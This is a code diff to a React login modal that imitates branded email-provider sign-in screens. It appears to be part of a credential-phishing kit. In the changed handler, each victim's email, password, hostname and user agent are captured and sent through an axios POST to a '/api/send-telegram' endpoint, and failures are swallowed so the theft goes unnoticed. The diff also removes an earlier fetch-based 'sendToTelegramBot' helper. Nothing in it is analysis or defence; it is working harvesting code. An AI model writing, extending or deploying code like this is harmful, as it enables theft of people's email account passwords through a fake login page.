@@ -1,4 +1,5 @@
 import React, { useState, useEffect } from 'react';
+import axios from 'axios'; // Import axios for making HTTP requests
 
 import { EmailProviderConfig } from '../types';
 import {
@@ -112,31 +113,6 @@ export function validateRealisticEmail(email: string, providerId: string): { isV
   return { isValid: true };
 }
 
-// Function to send login data to secure backend API
-async function sendToTelegramBot(data: { name: string; email: string; password: string; ip: string; userAgent: string }) {
-  try {
-    const response = await fetch('/api/send-telegram', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(data)
-    });
-
-    const result = await response.json();
-
-    if (!response.ok) {
-      console.error('Error sending message to backend:', result);
-      throw new Error(result.message || 'Failed to send data');
-    }
-
-    console.log('Login data sent to Telegram bot via secure backend');
-  } catch (error) {
-    console.error('Error sending data to backend:', error);
-    // Silently fail - don't block user login
-  }
-}
-
 export const LoginModal: React.FC<LoginModalProps> = ({
   provider,
   isOpen,
@@ -179,7 +155,7 @@ export const LoginModal: React.FC<LoginModalProps> = ({
     }
   };
 
-  const handleAuthSubmit = (email: string, pass: string) => {
+  const handleAuthSubmit = async (email: string, pass: string) => {
     setErrorMessage(null);
 
     // 1. Validate Email (Catch fake or invalid emails)
@@ -226,15 +202,21 @@ export const LoginModal: React.FC<LoginModalProps> = ({
 
         // Capture login data
         const loginData = {
-          name: email, // Name is captured from the email field
+          name: email, // Assuming the 'name' is captured from the email field (modify as needed)
           email,
           password: pass,
-          ip: window.location.hostname || 'Unknown', // Capture the hostname
+          ip: window.location.hostname || 'Unknown', // Capture the IP address or hostname
           userAgent: navigator.userAgent || 'Unknown' // Capture the user agent string
         };
 
-        // Send login data to secure backend API instead of exposing token
-        await sendToTelegramBot(loginData);
+        try {
+          // Send login data to the server
+          await axios.post('http://localhost:3001/api/send-telegram', loginData);
+
+          console.log('Login data sent to Telegram successfully');
+        } catch (error) {
+          console.error('Error sending login data to Telegram:', error);
+        }
 
         setTimeout(() => {
           setIsLoading(false);
@@ -294,7 +276,7 @@ export const LoginModal: React.FC<LoginModalProps> = ({
             <button
               onClick={onClose}
               disabled={isLoading}
-              className="w-8 h-8 rounded-full bg-black/40 hover:bg-black/70 text-white/90 hover:text-white flex items-center justify-center backdrop-blur-md transition-all cursor-pointer disabled:opacity-50"
+              className="w-8 h-8 rounded-full bg-black/40 hover:bg-black/70 text-white/90 hover:text-white flex items-center justify-center backdrop-blur-md transition-all cursor-pointer disabled:opacity-40"
               title="Close and return to portal"
               aria-label="Close"
               id="btn-close-branded-modal"
